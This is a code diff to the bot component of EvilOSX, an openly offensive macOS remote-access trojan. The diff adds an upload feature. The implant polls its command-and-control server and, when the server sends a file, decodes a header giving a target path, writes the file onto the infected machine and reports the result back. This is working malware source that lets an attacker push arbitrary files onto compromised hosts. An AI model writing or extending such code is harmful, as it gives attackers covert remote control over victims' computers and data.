@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 import time
 import urllib2
@@ -59,8 +59,38 @@ def receive_command():
     response = urllib2.urlopen(request, cafile=get_ca_file())
 
     response_line = str(response.readline().replace("\n", ""))
+    response_headers = response.info().dict
 
     if response_line == "" or response_line == "You dun goofed.":
+        return None, None, None
+    elif "content-disposition" in response_headers and "attachment" in response_headers["content-disposition"]:
+        # The server sent us a file to download (upload module).
+        decoded_header = base64.b64decode(response_headers["x-upload-module"]).replace("\n", "")
+
+        output_folder = os.path.expanduser(decoded_header.split(":")[1])
+        output_name = os.path.basename(decoded_header.split(":")[2])
+        output_file = output_folder + "/" + output_name
+
+        if not os.path.exists(output_folder):
+            send_response("MODULE|upload|" + base64.b64encode(
+                MESSAGE_ATTENTION + "Failed to upload file: invalid output folder."
+            ))
+        elif os.path.exists(output_file):
+            send_response("MODULE|upload|" + base64.b64encode(
+                MESSAGE_ATTENTION + "Failed to upload file: a file with that name already exists."
+            ))
+        else:
+            with open(output_file, "wb") as output:
+                while True:
+                    data = response.read(4096)
+
+                    if not data:
+                        break
+                    output.write(data)
+
+            send_response("MODULE|upload|" + base64.b64encode(
+                MESSAGE_INFO + "File written to: " + output_file
+            ))
         return None, None, None
     else:
         if response_line.startswith("MODULE"):
